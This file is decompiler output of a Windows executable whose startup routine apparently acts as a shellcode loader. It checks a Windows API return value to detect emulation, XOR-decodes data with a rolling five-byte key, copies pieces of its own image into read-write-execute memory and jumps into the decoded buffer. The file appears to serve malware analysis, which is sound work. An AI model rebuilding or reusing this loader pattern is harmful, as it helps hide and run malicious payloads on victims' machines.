// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 13101000: void fn13101000(Stack Eq_2 dwArg04, Stack Eq_3 dwArg08, Stack word32 dwArg0C, Stack (ptr word32) dwArg10, Stack Eq_6 dwArg14, Stack (arr Eq_26) dwArg18)
void fn13101000(LPVOID dwArg04, LPVOID dwArg08, word32 dwArg0C, word32 * dwArg10, LPVOID dwArg14, Eq_26 dwArg18[])
{
	*dwArg10 = dwArg0C;
	word16 wLoc0C_21 = (word16) (uint32) ((uint64) (uint32) dwArg14 % 0x05);
	word32 dwArg04_26 = dwArg04 + dwArg14;
	while (true)
	{
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == 0x00)
			break;
		*dwArg08 = (Eq_3) (byte) ((int32) *dwArg04_26 ^ (word32) (&((&((&((&((&((&((&((&((&((&((&((&((&((&((&((&((&((&((&(dwArg18)[(int32) wLoc0C_21].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000))[0x00].a0000)[0x00]);
		word16 cx_66 = wLoc0C_21 + 0x01;
		wLoc0C_21 = cx_66;
		if ((int32) cx_66 == 0x05)
			wLoc0C_21 = 0x00;
		dwArg08 = (Eq_3) ((char *) dwArg08 + 0x01);
		dwArg04_26 = dwArg04_26 + 0x01;
	}
}

// 131010A0: Register Eq_48 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	if (SafeArrayUnaccessData(null) == 0x80070057)
	{
		word32 ecx_143 = globals->dw13102000;
		fn13101000(fp - 0x28, fp - 0x28, 0x04, fp - 0x10, null, fp - 0x0234);
		word32 ecx_163 = globals->dw13102004;
		fn13101000(fp - 0x025C, fp - 600, 0x04, fp - 0x10, (void *) 0x04, fp - 0x0234);
		ui32 ecx_185 = globals->dw13102008;
		fn13101000(fp - 0x1C, fp - 0x14, 0x04, fp - 0x10, (void *) 0x08, fp - 0x0234);
		Eq_103 eax_211 = GetModuleHandleA(null);
		word32 eax_218 = globals->dw1310200C;
		fn13101000(fp - 0x28, fp - 0x1C, 0x04, fp - 0x10, (void *) 0x0C, fp - 0x0234);
		Eq_6 dwLoc0248_251 = globals->t13102010;
		fn13101000(fp - 600, fp - 0x0248, 0x04, fp - 0x10, (void *) 0x10, fp - 0x0234);
		Eq_6 ecx_279 = ecx_185 * 0x08 + 0x0C;
		Eq_6 dwLoc0250_274 = (void *) 0x14;
		word32 * dwLoc24_277 = &globals->dw13102014;
		Eq_3 eax_292 = VirtualAlloc(null, (char *) ecx_279 + ecx_163 + ecx_143, 0x3000, 0x40);
		word32 dwLoc0C_297 = eax_218 + eax_211 + ecx_279;
		Eq_6 dwLoc0264_301 = ecx_279;
		ui32 dwLoc08_302 = 0x00;
		Eq_167 dwLoc18_303 = null;
		while (0x01 != 0x00)
		{
			if (dwLoc0264_301 == dwLoc0248_251)
			{
				ui32 edx_430 = dwLoc08_302 + 0x01;
				dwLoc08_302 = edx_430;
				if (edx_430 == ecx_185)
					break;
				word32 edx_436 = *dwLoc24_277;
				fn13101000(fp - 0x1C - dwLoc0250_274, fp - 0x1C, 0x04, fp - 0x10, dwLoc0250_274, fp - 0x0234);
				LPVOID * ecx_465 = dwLoc24_277 + 0x01;
				Eq_6 eax_462 = (char *) dwLoc0250_274 + 0x04;
				dwLoc0248_251 = (Eq_6) *ecx_465;
				fn13101000(fp - 0x0248 - eax_462, fp - 0x0248, 0x04, fp - 0x10, eax_462, fp - 0x0234);
				dwLoc0250_274 = (Eq_6) ((char *) eax_462 + 0x04);
				dwLoc24_277 = (word32 *) ((char *) ecx_465 + 0x04);
				dwLoc0264_301 = null;
				dwLoc0C_297 = (byte *) (eax_211 + edx_436 / 0x04);
			}
			Mem415[eax_292 + dwLoc18_303:byte] = Mem0[dwLoc0C_297 + 0x00:byte];
			dwLoc0C_297 = dwLoc0C_297 + 0x01;
			dwLoc18_303 = dwLoc18_303 + 0x01;
			dwLoc0264_301 = (Eq_6) ((char *) dwLoc0264_301 + 0x01);
		}
		fn13101000(eax_292 - ecx_279, eax_292, ecx_163, fp - 0x0238, ecx_279, fp - 0x0234);
		word32 esp_375;
		word32 ebp_376;
		byte SCZO_377;
		word32 eax_378;
		word32 ecx_379;
		byte SZO_380;
		byte C_381;
		word32 ebx_382;
		word32 esi_383;
		byte Z_384;
		word32 edx_385;
		byte dl_386;
		(eax_292 + 0x0F50)();
		return 0x00;
	}
	else
	{
		word32 esp_120;
		word32 ebp_121;
		byte SCZO_122;
		Eq_48 eax_123;
		word32 ecx_124;
		byte SZO_125;
		byte C_126;
		word32 ebx_127;
		word32 esi_128;
		byte Z_129;
		word32 edx_130;
		byte dl_131;
		((<anonymous> **) 0x28)();
		return eax_123;
	}
}

